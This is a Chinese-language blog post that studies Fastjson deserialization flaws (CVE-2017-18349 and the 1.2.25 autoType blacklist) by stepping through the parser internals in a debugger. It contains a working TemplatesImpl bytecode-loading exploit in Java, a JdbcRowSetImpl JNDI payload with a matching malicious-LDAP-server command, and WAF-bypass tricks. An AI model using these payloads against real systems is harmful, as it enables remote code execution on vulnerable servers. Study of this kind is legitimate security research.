<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Fastjson反序列化 | n4c1's Blog</title><meta name="author" content="n4c1"><meta name="copyright" content="n4c1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349)之前虽然也学了fastjson历史漏洞, 也跟着其他师傅的文章调试了一遍, 但大多囫囵吞枣, 也忘得差不多了, 最近又遇到很多fastjson的题目, 打算不看文章, 自己重新过一遍fastjson反序列化的流程, 文中解释与用词可能不太准确, 师傅们轻喷 TemplatesImpl先看exp 12345">
<meta property="og:type" content="article">
<meta property="og:title" content="Fastjson反序列化">
<meta property="og:url" content="http://example.com/2025/09/10/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="n4c1&#39;s Blog">
<meta property="og:description" content="fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349)之前虽然也学了fastjson历史漏洞, 也跟着其他师傅的文章调试了一遍, 但大多囫囵吞枣, 也忘得差不多了, 最近又遇到很多fastjson的题目, 打算不看文章, 自己重新过一遍fastjson反序列化的流程, 文中解释与用词可能不太准确, 师傅们轻喷 TemplatesImpl先看exp 12345">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/head.jpg">
<meta property="article:published_time" content="2025-09-10T06:46:57.000Z">
<meta property="article:modified_time" content="2025-09-10T06:47:38.372Z">
<meta property="article:author" content="n4c1">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/head.jpg"><link rel="shortcut icon" href="/img/head.jpg"><link rel="canonical" href="http://example.com/2025/09/10/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Fastjson反序列化',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-09-10 14:47:38'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="n4c1's Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">63</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/home_page.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="n4c1's Blog"><span class="site-name">n4c1's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Fastjson反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-10T06:46:57.000Z" title="发表于 2025-09-10 14:46:57">2025-09-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-10T06:47:38.372Z" title="更新于 2025-09-10 14:47:38">2025-09-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Fastjson反序列化"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349)"></a>fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349)</h2><p>之前虽然也学了fastjson历史漏洞, 也跟着其他师傅的文章调试了一遍, 但大多囫囵吞枣, 也忘得差不多了, 最近又遇到很多fastjson的题目, 打算不看文章, 自己重新过一遍fastjson反序列化的流程, 文中解释与用词可能不太准确, 师傅们轻喷</p>
<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>先看exp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;  </span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;  </span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonWithTemplatesImpl</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;  </span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(test.class.getName());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">randonClassName</span> <span class="operator">=</span> <span class="string">&quot;n4c1&quot;</span> + System.nanoTime();  </span><br><span class="line">        cc.setName(randonClassName);  </span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">byte</span>[] evilCode = cc.toBytecode();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">evilCodeBase64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(evilCode);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EVIL_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + EVIL_CLASS + <span class="string">&quot;\&quot;,&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCodeBase64 + <span class="string">&quot;\&quot;],&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#x27;_name&#x27;:&#x27;a.b&#x27;,&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;  </span><br><span class="line">            System.out.println(payload);  </span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField); <span class="comment">// 允许反序列化非公有属性  </span></span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>通过调试源码, 可用大致梳理出json字符串解析流程<br>首先我们可以看见几个非常重要的类, 他们分别扮演了以下角色:</p>
<ul>
<li>json解析器(<code>json paser</code>)  ,对应 <code>com.alibaba.fastjson.parser.DefaultJSONParser</code>, </li>
<li>词法分析器(<code>lexer</code>), 主要作用是对各个token进行解析(即字符层面的识别), 通俗的说就是在一长串json字符串中定位出键与值.</li>
<li>反序列化器(<code>deserilizer</code>), 主要作用是反序列化出各个类, 不同的类对应不同的反序列化器, 由json解析器通过ParserConfig来获取. 对于一个JavaBean, 对应的反序列化器是<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer</code></li>
</ul>
<p>json解析器 (<code>DefaultJSONParser</code>)包装了词法分析器(<code>lexer</code>), 而反序列化器与json解析器在解析json字符串时互相依赖 (准确地说, json解析器负责解析出反序列化需要的数据, 反序列化器负责使用这些数据来还原出这个对象,  由于json是一个可以嵌套的结构, 因此这一过程往往是交错进行的)</p>
<p>可以去看一下DefaultJSONParser的属性如下图</p>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527220313.png" alt="image.png"></p>
<p>反序列化器则定义在<code>ParserConfig</code>中<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527220524.png" alt="image.png"></p>
<p>在本例中, 由于我们传入的基础类是<code>Object.class</code>, 当我们从<code>Object.class</code>开始, json解析器(<code>DefaultJSONParser</code>)拿到<code>Object.class</code>的反序列化器, 开始反序列化. 在此基础上, 开始解析json字符串, 这个工作由<code>DefaultJSONParser</code>发起. 由其包装的词法分析器(<code>lexer</code>)逐字读取并分析, 当词法分析器读到<code>@type</code>时,  发现需要反序列化出来一个类, 获取该类名称为 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>, 此时<code>DefaultJSONParser</code>获取该类的反序列化器(即<code>JavaBeanDeserializer</code>), 由此反序列化器进行反序列化. 初始化该反序列化器时会读取<code>JavaBean</code>的各种信息并保存起来, 包括<code>setter</code>, <code>Field</code>, <code>getter</code>, 很多师傅所说的对<code>getter</code>和<code>setter</code>方法的要求也就是在这一过程产生的.</p>
<p>拿到<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的反序列化器后, 之后的过程交由<code>JavaBeanDeserializer</code>进行, 开始反序列化, 首先是使用默认的构造器创建一个<code>TemplatesImpl</code>的实例, 之后为其逐一添加属性, 此时词法分析器会扫描json字符串中<code>TemplatesImpl</code>类的字段(<code>Field</code>), 并进行添加, 此过程中<code>JavaBeanDeserializer</code>会获取并使用字段反序列化器(<code>FieldDeserializer</code>)来对字段的信息进行识别和反序列化(因为字段也可能是任何类型的对象),  <code>FieldDeserializer</code>会尝试调用<code>getter</code>和<code>setter</code>为对应的属性赋值, 本例中恶意字节码加载从此处开始触发, 当读到<code>_outputProperties</code>这个字段时,(这里json中的字符串虽然是<code>_outputProperties</code>, 但是会自动将其识别为<code>outputProperties</code>, 这个过程由smartMatch方法完成), 调用它的getter, 触发恶意类加载.<br>具体的getter和setter调用过程由FieldDeserializer的setValue方法执行,  &#x3D;&#x3D;当该字段有settter时直接调用setter而不调用getter, 无settter时调用getter&#x3D;&#x3D;尝试获取已经生成的对象中对应字段的引用, 并为其赋值</p>
<p>以上是我对反序列化过程的大致过程的理解, 这些解释是在调试的过程中得出的, 那么就从头来跟一下调试过程吧!</p>
<p>不必多说, 我们遇到的第一个关键步骤就是这里:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530154047.png" alt="image.png"></p>
<p>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;    通过输入的json字符串, 获取对应的json解析器(其中包含lexer), 通过初始类型(<code>Object.class</code>), 获取其反序列化器, 开始反序列化, this指针将当前的json解析器也传给了反序列化器, 因为反序列化的过程是需要解析json的</p>
<p>跟进 </p>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530154827.png" alt="image.png"></p>
<p>由于此时我们传入的是Object.class这样一个很宽泛的对象, fastjson首先判断其是否为一个泛型数组, 这是因为如果要反序列化出数组, 那么就可以直接可以将键值对插入到一个Array中, 而若只单单是一个Object.class, 其中不存在任何属性, 无法将得到的属性放进去, 需要后续使用fastjson自己实现的JSONObjcet这个类(一个map)来暂存. Serializable.class也是类似, 并不能实例化后向其中添加属性</p>
<p>继续跟进, 会走到这里<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530165435.png" alt="image.png"><br>正如上面的解释, 此时实例了一个JSONObject<br>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;    <code>lexer</code>识别到第一个字符<code>&#123;</code>, 实例出JSONObject, 准备解析出json字符串中的数据往里面添加</p>
<p>继续跟进, 来到这一步<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530170321.png" alt="image.png"><br>在这里,前面的过程大致就是判断了json格式的正确性, 以及使lexer的指针跳过多余但允许出现的符号(逗号, 注释)<br>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;   扫描出第一个key为<code>@type</code></p>
<p>继续往下看, lexer会扫描出类的名称, 之后json解析器加载这个类, 通过这个类获取对应的反序列化器, 进行反序列化<br>注意获取的反序列化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530172742.png" alt="image.png"><br>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;   拿到<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的反序列化器, 这一过程中, 也已经拿到了字段反序列化器,其中包含了getter, setter 如上图.  师傅们可以自行调试查看过程, 为了不打断连贯性, 这个过程有空放在后面补充</p>
<p>继续跟进到这里<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531005754.png" alt="image.png"><br>这个方法的前面是对上下文信息和json格式的判断, 主要看这里的for循环, 先是对已经拿到的FieldDeserilizer进行遍历, 判断其操作的是否为一些基础类型,  当匹配到时, 标记<code>matchField = true;</code>跳过json字符串的扫描, 直接进入后面对属性赋值的过程,  从而使用特定的反序列化方式进而提升效率<br>这里我们的恶意类有以下三个字段反序列化器, 都不是特殊类型<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531011256.png" alt="image.png"></p>
<p>这个过程结束后, 就是逐个字段扫描并赋值, 当走到 key为_outputProperties时,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531011753.png" alt="image.png"></p>
<p>拿到键名, 进行一些特殊键名的判断, 开始解析<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012122.png" alt="image.png"></p>
<p>拿到_outputProperties字段的反序列化器, 开始反序列化字段<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012257.png" alt="image.png"><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012345.png" alt="image.png"><br>跟进<br>通过&#x3D;&#x3D;FieldValue反序列化器&#x3D;&#x3D;拿到值后, setValue赋值<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012635.png" alt="image.png"></p>
<p>跟进<br>触发getter<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012807.png" alt="image.png"><br>如开篇总结所说_outputProperties是一个readonly属性(只有getter), fastjson会尝试调用它的getter获得内部map的引用来为其赋值</p>
<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplPoc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/ubjazx\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(PoC);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调试流程与上面一样, 只不过这里使用的是jndi<br>使用JNDI-Injection-Exploit起一个ldap服务即可</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A 127.0.0.1</span><br></pre></td></tr></table></figure>
<h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><p>在默认的<code>DefaultJSONParser</code>中有以下行为可能可以用来绕过waf<br>默认开启允许任意数量逗号</p>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527155617.png" alt="image.png"></p>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527155938.png" alt="image.png"><br>skipWhitespace()函数会调用skipComment(); 可以添加注释<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527160630.png" alt="image.png"></p>
<p>添加注释<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527160955.png" alt="image.png"></p>
<h2 id="fastjson-1-2-25-反序列化漏洞-对抗checkAutoType的开始"><a href="#fastjson-1-2-25-反序列化漏洞-对抗checkAutoType的开始" class="headerlink" title="fastjson 1.2.25 反序列化漏洞 对抗checkAutoType的开始"></a>fastjson 1.2.25 反序列化漏洞 对抗checkAutoType的开始</h2><h3 id="利用缓存绕过黑名单"><a href="#利用缓存绕过黑名单" class="headerlink" title="利用缓存绕过黑名单"></a>利用缓存绕过黑名单</h3><p>在此版本中, 上面的exp已经用不了了, 有以下报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.JSONException: autoType is not support. com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">	at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:844)</span><br><span class="line">	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:322)</span><br><span class="line">	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)</span><br><span class="line">	at com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.deserialze(JavaObjectDeserializer.java:45)</span><br><span class="line">	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:639)</span><br><span class="line">	at com.alibaba.fastjson.JSON.parseObject(JSON.java:339)</span><br><span class="line">	at com.alibaba.fastjson.JSON.parseObject(JSON.java:302)</span><br><span class="line">	at FastjsonWithTemplatesImpl.main(FastjsonWithTemplatesImpl.java:41)</span><br></pre></td></tr></table></figure>
<p>autoType禁用了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类, 也就是<code>@type</code>不允许此类, 我们在报错位置打断点, 看看是哪里出问题了<br>可以看见断点在了下面这个位置<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531130503.png" alt="image.png"></p>
<p>这是在ParseConfig中的checkAutoType方法, 上面提到过ParseConfig有一个很重要的作用是用来存放反序列化器, 这里很明显更新后的版本又增加了对需要加载的类的类名的限制, 设置了一个黑名单, 以黑名单中起始的包名都将直接报错<br>具体黑名单如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0 = &quot;bsh&quot;</span><br><span class="line">1 = &quot;com.mchange&quot;</span><br><span class="line">2 = &quot;com.sun.&quot;</span><br><span class="line">3 = &quot;java.lang.Thread&quot;</span><br><span class="line">4 = &quot;java.net.Socket&quot;</span><br><span class="line">5 = &quot;java.rmi&quot;</span><br><span class="line">6 = &quot;javax.xml&quot;</span><br><span class="line">7 = &quot;org.apache.bcel&quot;</span><br><span class="line">8 = &quot;org.apache.commons.beanutils&quot;</span><br><span class="line">9 = &quot;org.apache.commons.collections.Transformer&quot;</span><br><span class="line">10 = &quot;org.apache.commons.collections.functors&quot;</span><br><span class="line">11 = &quot;org.apache.commons.collections4.comparators&quot;</span><br><span class="line">12 = &quot;org.apache.commons.fileupload&quot;</span><br><span class="line">13 = &quot;org.apache.myfaces.context.servlet&quot;</span><br><span class="line">14 = &quot;org.apache.tomcat&quot;</span><br><span class="line">15 = &quot;org.apache.wicket.util&quot;</span><br><span class="line">16 = &quot;org.codehaus.groovy.runtime&quot;</span><br><span class="line">17 = &quot;org.hibernate&quot;</span><br><span class="line">18 = &quot;org.jboss&quot;</span><br><span class="line">19 = &quot;org.mozilla.javascript&quot;</span><br><span class="line">20 = &quot;org.python.core&quot;</span><br><span class="line">21 = &quot;org.springframework&quot;</span><br></pre></td></tr></table></figure>

